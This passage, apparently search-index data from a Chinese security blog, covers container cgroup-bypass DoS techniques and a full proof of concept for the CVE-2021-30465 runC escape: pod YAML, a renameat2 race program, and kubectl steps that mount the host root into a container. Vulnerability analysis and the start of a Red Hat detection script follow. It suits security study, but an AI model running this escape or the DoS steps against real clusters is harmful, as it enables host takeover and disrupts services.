在两个不同的核心上运行两个容器，在一个恶意容器中不断调用&lt;code&gt;sync()&lt;/code&gt;，在其它容器中进行I/O操作。&lt;/p&gt;
&lt;p&gt;[资源释放攻击](Venkatanathan Varadarajan, Thawan Kooburat, Benjamin Farley, Thomas Ris-tenpart, and Michael M Swift. 3: Improve Your CloudPerformance (At Your Neighbor&#39;s Expense). InACM CCS, 2012.)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# iostat
yum install -y sysstat

# 新安装一块硬盘，重启系统
lsblk 
NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda               8:0    0   30G  0 disk 
├─sda1            8:1    0    1G  0 part /boot
└─sda2            8:2    0   29G  0 part 
    ├─centos-root 253:0    0   27G  0 lvm  /
    └─centos-swap 253:1    0    2G  0 lvm  [SWAP]
sdb               8:16   0   10G  0 disk /mnt
sr0              11:0    1  4.5G  0 rom

# 格式化磁盘
mkfs.ext4 /dev/sdb

# 挂载
mount /dev/sdb /mnt

# victim 容器
docker run -d --name victim -v /mnt:/tmp --cpuset-cpus=&amp;quot;1&amp;quot; ubuntu /bin/bash -c &amp;quot;while true; do echo victim; sleep 1;done&amp;quot;
# attacker 容器
docker run -d --name attacker --cpuset-cpus=&amp;quot;2&amp;quot; ubuntu /bin/bash -c &amp;quot;while true; do echo attacker; sleep 1;done&amp;quot;

# 将脚本cp到attacker下
docker cp mysync attacker:/root

# 进入 attacker
docker exec -it attacker /bin/bash
cd /root
./mysync
exit

# 进入 victim
docker exec -it victim /bin/bash
yum install fio -y

fio -ioengine=libaio -bs=4k -direct=1 -thread -rw=write -size=5G -filename=/mnt/test -name=&amp;quot;Max throughput&amp;quot; -iodepth=16 -runtime=20
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;case 3(策略3)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用系统服务日志，它生成消耗cpu和块设备带宽的工作负载。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;exp：&lt;/strong&gt;&lt;br&gt;
re：周天昱,申文博,杨男子,李金库,秦承刚,喻望.Docker组件间标准输入输出复制的DoS攻击分析[J].网络与信息安全学报,2020,6(06):45-56.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当使用 printf 在容器实例内持续输出数据 到 stdout，可以引发 Docker 组件的高 CPU 消耗， 造成对宿主机 CPU 资源的 DoS 攻击。其原因是 Docker 各个组件间通过自动触发的 goroutine 不断对 stdio 进行复制，消耗大量 CPU，导致 DoS 攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;case 4(策略2、3)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用在容器引擎在容器引擎进程和内核线程上是生成额外的为计算的工作负载。&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;case 5(策略2、4)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;利用软中断处理机制在内核线程上消耗CPU周期和中断上下文。&lt;/p&gt;
">【容器】容器绕过Cgroups限制策略</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cve-2021-30465-runc-tao-yi-lou-dong/"" data-c="
          &lt;h2 id=&#34;cve-2021-30465-runc逃逸漏洞&#34;&gt;CVE-2021-30465 runC逃逸漏洞&lt;/h2&gt;
&lt;h3 id=&#34;poc&#34;&gt;POC&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;搭建k8s环境。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建20个(可以更多，实验效果会更明显)容器，其中一个为正常容器c1，其余多个都是无法正常启动的容器(可以直接用donotexists.com/do/not:exist)容器c2~c20。&lt;/p&gt;
&lt;p&gt;以及创建两个volume数据卷test1和test2，分别挂载在各个容器中。env.yaml文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;apiVersion: v1
kind: Pod
metadata:
    name: attack
spec:
    terminationGracePeriodSeconds: 1
    containers:
    - name: c1
      image: ubuntu:latest
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      env:
          - name: MY_POD_UID
            valueFrom:
              fieldRef:
                fieldPath: metadata.uid
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test2
    - name: c2
      image: donotexists.com/do/not:exist
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test1/mnt1
        - name: test2
          mountPath: /test1/mnt2
        - name: test2
          mountPath: /test1/mnt3
        - name: test2
          mountPath: /test1/mnt4
        - name: test2
          mountPath: /test1/zzz
    - name: c3
      image: donotexists.com/do/not:exist
      command: [ &amp;quot;/bin/sleep&amp;quot;, &amp;quot;inf&amp;quot; ]
      volumeMounts:
        - name: test1
          mountPath: /test1
        - name: test2
          mountPath: /test1/mnt1
        - name: test2
          mountPath: /test1/mnt2
        - name: test2
          mountPath: /test1/mnt3
        - name: test2
          mountPath: /test1/mnt4
        - name: test2
          mountPath: /test1/zzz
    
    ...省略c4~c20...
    
    volumes:
    - name: test1
      emptyDir:
        medium: &amp;quot;Memory&amp;quot;
    - name: test2
      emptyDir:
        medium: &amp;quot;Memory&amp;quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;准备一个C程序race.c，编译成race二进制文件，&lt;code&gt;gcc race.c -03 -o race&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#define _GNU_SOURCE
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/syscall.h&amp;gt;

/* musl libc does not define RENAME_EXCHANGE */
#ifndef RENAME_EXCHANGE
#define RENAME_EXCHANGE 2
#endif

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, &amp;quot;Usage: %s name1 name2 linkdest\n&amp;quot;, argv[0]);
        exit(EXIT_FAILURE);
    }
    char *name1 = argv[1];
    char *name2 = argv[2];
    char *linkdest = argv[3];

    int dirfd = open(&amp;quot;.&amp;quot;, O_DIRECTORY|O_CLOEXEC);
    if (dirfd &amp;lt; 0) {
        perror(&amp;quot;Error open CWD&amp;quot;);
        exit(EXIT_FAILURE);
    }

    if (mkdir(name1, 0755) &amp;lt; 0) {
        perror(&amp;quot;mkdir failed&amp;quot;);
        //do not exit
    }
    if (symlink(linkdest, name2) &amp;lt; 0) {
        perror(&amp;quot;symlink failed&amp;quot;);
        //do not exit
    }

    while (1)
    {
        int rc = syscall(SYS_renameat2, dirfd, name1, dirfd, name2, RENAME_EXCHANGE);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将yaml编排好的配置项启动，&lt;code&gt;kubectl apply -f env.yaml&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;等待容器启动，&lt;code&gt;kubectl get pods&lt;/code&gt;，会发现只有一个pod正常启动：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454101561.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;
&lt;p&gt;将race copy到c1中。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl cp race -c c1 attack:/test1/
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在c1中生成&lt;code&gt;/test2/test2&lt;/code&gt;链接文件，指向根目录&lt;code&gt;/&lt;/code&gt;(这里软连接的文件名务必和数据卷名字相同)。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl exec -ti pod/attack -c c1 -- bash
ln -s / /test2/test2
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在c1容器中启动race程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd test1
seq 1 4 | xargs -n1 -P4 -I{} ./race mnt{} mnt-tmp{} /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在这里的作用是启动四个进程，创建&lt;code&gt;mnt-tmpX&lt;/code&gt;软连接，指向&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;，然后通过系统调用&lt;code&gt;renameat2&lt;/code&gt;不断交换&lt;code&gt;mntX&lt;/code&gt;和&lt;code&gt;mnt-tmpX&lt;/code&gt;两个文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后将原先c2-c20的容器镜像设置回一个正常的容器镜像即可（即让c2-c20容器正常启动）&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for c in {2..20}; do
  kubectl set image pod attack c$c=ubuntu:latest
done
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454140946.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;稍等后，然后&lt;code&gt;kubectl get pods&lt;/code&gt;可以看到所有pod正常启动：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454154611.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;此时查看所有容器的&lt;code&gt;/test1/zzz&lt;/code&gt;目录，会发现有部分容器指向宿主机根目录，逃逸成功。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for c in {2..20}; do
  echo ~~ Container c$c ~~
  kubectl exec -ti pod/attack -c c$c -- ls /test1/zzz
done
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454170727.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h3&gt;
&lt;p&gt;容器去挂载卷时，是由容器引擎去管理的，本漏洞的容器引擎是runC，即对应卷的所有权交给了容器引擎。&lt;/p&gt;
&lt;p&gt;CVE-2021-30465就是因为runC没有处理好卷下面的资源竞争而导致的。&lt;/p&gt;
&lt;p&gt;当挂载一个volume数据卷时，runC会信任源文件，会让内核跟随符号链接到指定的文件位置，但runC不信任目标文件参数，会调用&lt;code&gt;filepath-securejoin&lt;/code&gt;库去解析符号链接，确保目标文件在容器的根文件系统内。&lt;code&gt;SecureJoinVFS()&lt;/code&gt;文档解释道，只有确保要check的文件不会被符号链接所替换，该方法才是安全的，但是问题就是我们可以进行替换。&lt;/p&gt;
&lt;p&gt;runC是通过一个&lt;code&gt;securejoin.SecureJoinVFS()&lt;/code&gt;函数，先对要挂载的目录进行check，然后再进行mount操作，而在这期间就会产生一个时间差，从而产生条件竞争(TOCTTOU, time-of-check-to-time-of-use)，也就是说，在check一个合法文件时，文件被替换成非法文件，那么这个check结束后，非法文件会被mount。在这里可能会发生跟随软链接的行为，将宿主机上的目录挂载至容器，从而产生逃逸。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TOCTTOU：先检查某个前置条件，然后介于这个前置条件进行某项操作，但是在检查和操作的时间间隔内条件可能被改变。通常发生在多线程在处理某个非原子操作的过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;poc分析&#34;&gt;POC分析&lt;/h3&gt;
&lt;p&gt;在创建pod时可以创建卷，例如emptydir类型的卷，其和pod的生命周期一样，pod中所有容器都可以共享该卷，卷会存储在宿主机的&lt;code&gt;/var/lib/kubelet/pods/podsid/volumes/kubenetes.io~empty-dir/下&lt;/code&gt;，例如：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1639454184827.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;该pod中所有容器可以通关挂载这些卷来共享数据。&lt;/p&gt;
&lt;p&gt;首先用k8s创建一个pod，共包含20个容器(c1~c20)和两个volume(test1、test2)，c1是一个可以正常启动的容器，c2~c20都是故障容器，无法正常启动。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;c1正常挂载volume test1和test2分别到&lt;code&gt;/test1&lt;/code&gt;和&lt;code&gt;/test2&lt;/code&gt;下，然后利用race程序创建若干个正常文件&lt;code&gt;mnt&lt;/code&gt;和若干个指向&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;的软连接文件&lt;code&gt;mnt-tmp&lt;/code&gt;，然后程序while true不断交换&lt;code&gt;mnt&lt;/code&gt;和&lt;code&gt;mnt-tmp&lt;/code&gt;。另外在&lt;code&gt;/test2&lt;/code&gt;下创建名为&lt;code&gt;test2&lt;/code&gt;的软连接指向&lt;code&gt;/&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在创建pod时会为每个pod生成一个PID_UID，并为每个pod创建一个目录&lt;code&gt;/var/lib/kubelet/pods/podId&lt;/code&gt;，而pod中创建的每个容器都会默认注入一个环境变量&lt;code&gt;MY_POD_UID&lt;/code&gt;，即当前所属pod的id。&lt;/p&gt;
&lt;p&gt;另外为pod创建的卷(以empty-dir类型的卷为例)默认会存在node宿主机的&lt;code&gt;/var/lib/kubelet/pods/podId/volumes/kubenetes.io~empty-dir/&lt;/code&gt;下。&lt;/p&gt;
&lt;p&gt;宿主机文件系统上的文件看起来是这样的：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt1
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt-tmp1 -&amp;gt; /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt2 -&amp;gt; /var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt-tmp2
...
/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2/test2 -&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;然后再其余容器正常启动时，就会先去挂载test1数据卷到&lt;code&gt;/test1&lt;/code&gt;目录下，然后挂载test2到/test1/mnt/下。&lt;/p&gt;
&lt;p&gt;此过程中c1是不断交换容器的&lt;code&gt;/test1/mnt&lt;/code&gt;和&lt;code&gt;/test1/mnt-tmp&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;因此其它容器在将卷test2挂载至&lt;code&gt;/test1/mnt&lt;/code&gt;时，首先进行&lt;code&gt;securejoin.SecureJoinVFS&lt;/code&gt;检查&lt;code&gt;mnt&lt;/code&gt;，它是一个正常的文件目录，而当进行mount操作，&lt;code&gt;mntx&lt;/code&gt;被替换成了一个指向&lt;code&gt;/var/lib/kubelet/pods/podId/volumes/kubenetes.io~empty-dir/&lt;/code&gt;的软连接。&lt;/p&gt;
&lt;p&gt;所以本来要进行的操作：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;, 
&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/mnt&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跟随软连接后就变为了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;,
&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即相当于将卷test2的内容直接挂载在了&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;，即卷test2覆盖了该目录，因此再挂载test2数据卷到&lt;code&gt;test1/zzz&lt;/code&gt;目录时，就会进行如下操作：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2&amp;quot;, &amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于之前c1容器创建了&lt;code&gt;/test2/test2&lt;/code&gt;指向根目录，因此这里的&lt;code&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/&lt;/code&gt;下的&lt;code&gt;test2&lt;/code&gt;其实就是一个指向当前宿主机根目录的软链接（这也是为什么要创建和数据卷同名的软链接文件），即：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test2 -&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;于是以上操作就变成了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mount(&amp;quot;/&amp;quot;, &amp;quot;/var/lib/kubelet/pods/$MY_POD_UID/volumes/kubernetes.io~empty-dir/test1/zzz&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从而将宿主机根目录挂载到了容器的&lt;code&gt;/test1/zzz&lt;/code&gt;中，实现了容器逃逸。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;该漏洞的关键点在于runC在挂载数据卷时去check文件时不能保证文件不被符号链接所替换，如果被换掉那么挂载的目标文件可以指定为宿主机上的任意位置。&lt;/p&gt;
&lt;p&gt;该POC的关键点在于，k8s挂载时不能指定源，但可以决定目标，那么就可以创建设计好的符号链接，作为后面容器挂载的新源，从而实现逃逸。&lt;/p&gt;
&lt;h3 id=&#34;漏洞检测脚本&#34;&gt;漏洞检测脚本&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

# Copyright (c) 2021  Red Hat, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

VERSION=&amp;quot;1.0&amp;quot;

# Warning! Be sure to download the latest version of this script from its primary source:

BULLETIN=&amp;quot;https://access.redhat.com/security/vulnerabilities/RHSB-2021-004&amp;quot;

# DO NOT blindly trust any internet sources and NEVER do `curl something | bash`!

# This script is meant for simple detection of the vulnerability. Feel free to modify it for your
# environment or needs. For more advanced detection, consider Red Hat Insights:
# https://access.redhat.com/products/red-hat-insights#getstarted

# Checking against the list of vulnerable packages is necessary because of the way how features
# are back-ported to older versions of packages in various channels.

VULNERABLE_VERSIONS=(
    &#39;runc-0.0.8-1.git4155b68.el7&#39;
    &#39;runc-0.1.0-3.el7&#39;
    &#39;runc-0.1.1-4.el7&#39;
    &#39;runc-0.1.1-5.el7&#39;
    &#39;runc-1.0.0-1.rc2.el7&#39;
    &#39;runc-1.0.0-3.rc2.el7&#39;
    &#39;runc-1.0.0-6.gite800860.el7&#39;
    &#39;runc-1.0.0-12.1.gitf8ce01d.el7&#39;
    &#39;runc-1.0.0-14.rc4dev.git84a082b.el7&#39;
    &#39;runc-1.0.0-21.rc4.dev.gitaea4f21.el7&#39;
    &#39;runc-1.0.0-23.rc4.dev.git1d3ab6d.el7&#39;
    &#39;runc-1.0.0-24.rc4.dev.gitc6e4a1e.el7&#39;
    &#39;runc-1.0.0-26.rc4.dev.git9f9c962.el7&#39;
    &#39;runc-1.0.0-27.rc5.dev.git4bb1fe4.el7&#39;
    &#39;runc-1.0.0-37.rc5.dev.gitad0f525.el7&#39;
    &#39;runc-1.0.0-52.dev.git70ca035.el7_5&#39;
    &#39;runc-1.0.0-54.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-57.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-59.dev.git2abd837.el7&#39;
    &#39;runc-1.0.0-64.rc8.el7&#39;
    &#39;runc-1.0.0-64.rc9.el7&#39;
    &#39;runc-1.0.0-65.rc8.el7&#39;
    &#39;runc-1.0.0-66.rc8.el7_7&#39;
    &#39;runc-1.0.0-66.rc10.rhaos4.3.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.2.el7_8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.3.el7&#39;
    &#39;runc-1.0.0-68.rc10.el7_8&#39;
    &#39;runc-1.0.0-68.rc10.rhaos4.4.el7_8&#39;
    &#39;runc-1.0.0-69.rhaos4.4.git81f3917.el7&#39;
    &#39;runc-1.0.0-70.rhaos4.5.gite677e8b.el7&#39;
    &#39;runc-1.0.0-71.rhaos4.5.git5101761.el7&#39;
    &#39;runc-1.0.0-73.rhaos4.5.gitd2c3b70.el7&#39;
    &#39;runc-1.0.0-81.rhaos4.6.git5b757d4.el7&#39;
    &#39;runc-1.0.0-82.rhaos4.6.git086e841.el7&#39;
    &#39;runc-1.0.0-83.rhaos4.6.git8c2e7c8.el7&#39;
    &#39;runc-1.0.0-84.rhaos4.6.git7116f03.el7&#39;
    &#39;runc-1.0.0-85.rhaos4.6.git77a6f3c.el7&#39;
    &#39;runc-1.0.0-57.rc5.rhaos4.1.git2abd837.el8&#39;
    &#39;runc-1.0.0-60.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-61.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-61.rc8.rhaos4.2.git3cbe540.el8&#39;
    &#39;runc-1.0.0-62.rc8.rhaos4.1.git3cbe540.el8&#39;
    &#39;runc-1.0.0-63.rc8.el8&#39;
    &#39;runc-1.0.0-63.rc8.rhaos4.1.git3cbe540.el8_0&#39;
    &#39;runc-1.0.0-63.rc10.rhaos4.2.gitdc9208a.el8&#39;
    &#39;runc-1.0.0-64.rc9.el8&#39;
    &#39;runc-1.0.0-65.rc10.rhaos4.3.el8&#39;
    &#39;runc-1.0.0-65.rc10.rhaos4.4.el8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.2.el8&#39;
    &#39;runc-1.0.0-67.rc10.rhaos4.3.el8&#39;
    &#39;runc-1.0.0-68.rc10.rhaos4.4.el8&#39;
    &#39;runc-1.0.0-69.rhaos4.4.git81f3917.el8&#39;
    &#39;runc-1.0.0-70.rhaos4.5.gite677e8b.el8&#39;
    &#39;runc-1.0.0-71.rhaos4.5.git5101761.el8&#39;
    &#39;runc-1.0.0-72.rhaos4.5.giteadfc6b.el8&#39;
    &#39;runc-1.0.0-73.rhaos4.5.gitd2c3b70.el8&#39;
    &#39;runc-1.0.0-81.rhaos4.6.git5b757d4.el8&#39;
    &#39;runc-1.0.0-82.rhaos4.6.git086e841.el8&#39;
    &#39;runc-1.0.0-83.rhaos4.6.git8c2e7c8.el8&#39;
    &#39;runc-1.0.0-84.rhaos4.6.git7116f03.el8&#39;
    &#39;runc-1.0.0-85.rhaos4.6.git77a6f3c.el8&#39;
    &#39;runc-1.0.0-54.rc5.dev.git2abd837.module+el8+2769+577ad176&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8+2794+c81bb0a1&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+2956+30df4692&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+3049+59fd2bba&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0+4014+8662b6b2&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.0.0.z+3525+56c076c3&#39;
    &#39;runc-1.0.0-55.rc5.dev.git2abd837.module+el8.1.0+3468+011f0ab0&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.1.0+4908+72a45cef&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.2.0+6370+6fb6c8ca&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+7197+26156b7d&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+8236+8e428216&#39;
    &#39;runc-1.0.0-56.rc5.dev.git2abd837.module+el8.3.0+10171+12421f43&#39;
    &#39;runc-1.0.0-56.rc8.dev.git425e105.module+el8.0.0+4017+bbba319f&#39;
    &#39;runc-1.0.0-60.rc8.module+el8.1.0+4081+b29780af&#39;
    &#39;runc-1.0.0-61.rc8.module+el8.1.0+4873+4a24e241&#39;
    &#39;runc-1.0.0-64.rc9.module+el8.1.1+5259+bcdd613a&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+5728+ac3aae00&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+6369+1f4293b4&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+7659+b700d80e&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+9347+d4fa9cbb&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.2.0+9938+46853747&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7385+02cfa547&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7660+b7198318&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+7842+fbbcd85c&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+8233+627fbb78&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+8377+eff33c85&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+9348+d780f094&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.3.0+10188+4c10031c&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.4.0+9935+d4945f3f&#39;
    &#39;runc-1.0.0-64.rc10.module+el8.4.0+10193+e90fd8eb&#39;
    &#39;runc-1.0.0-65.rc10.module+el8.2.0+5762+aaee29fb&#39;
    &#39;runc-1.0.0-65.rc10.module+el8.2.0+6368+cf16aa14&#39;
    &#39;runc-1.0.0-66.rc10.module+el8.2.1+6465+1a51e8b6&#39;
    &#39;runc-1.0.0-66.rc10.module+el8.3.0+7084+c16098dd&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7635+9a181104&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7716+ce654703&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+7843+7fef9496&#39;
    &#39;runc-1.0.0-68.rc92.module+el8.3.0+8221+97165c3f&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.3.1+9857+68fb1526&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10197+7c295612&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10198+36d1d0e3&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10607+f4da7515&#39;
    &#39;runc-1.0.0-70.rc92.module+el8.4.0+10614+dd38312c&#39;
    &#39;docker-0.10.0-9.el7&#39;
    &#39;docker-0.11.1-19.el7&#39;
    &#39;docker-0.11.1-22.el7&#39;
    &#39;docker-1.1.2-9.el7&#39;
    &#39;docker-1.1.2-13.el7&#39;
    &#39;docker-1.2.0-1.8.el7&#39;
    &#39;docker-1.3.2-4.el7&#39;
    &#39;docker-1.4.1-37.el7&#39;
    &#39;docker-1.5.0-27.el7&#39;
    &#39;docker-1.5.0-28.el7&#39;
    &#39;docker-1.6.0-11.el7&#39;
    &#39;docker-1.6.2-8.el7&#39;
    &#39;docker-1.6.2-14.el7&#39;
    &#39;docker-1.7.1-108.el7&#39;
    &#39;docker-1.7.1-115.el7&#39;
    &#39;docker-1.8.2-7.el7&#39;
    &#39;docker-1.8.2-8.el7&#39;
    &#39;docker-1.8.2-10.el7&#39;
    &#39;docker-1.9.1-25.el7&#39;
    &#39;docker-1.9.1-40.el7&#39;
    &#39;docker-1.10.3-44.el7&#39;
    &#39;docker-1.10.3-46.el7.10&#39;
    &#39;docker-1.10.3-46.el7.14&#39;
    &#39;docker-1.10.3-57.el7&#39;
    &#39;docker-1.10.3-59.el7&#39;
    &#39;docker-1.12.5-14.el7&#39;
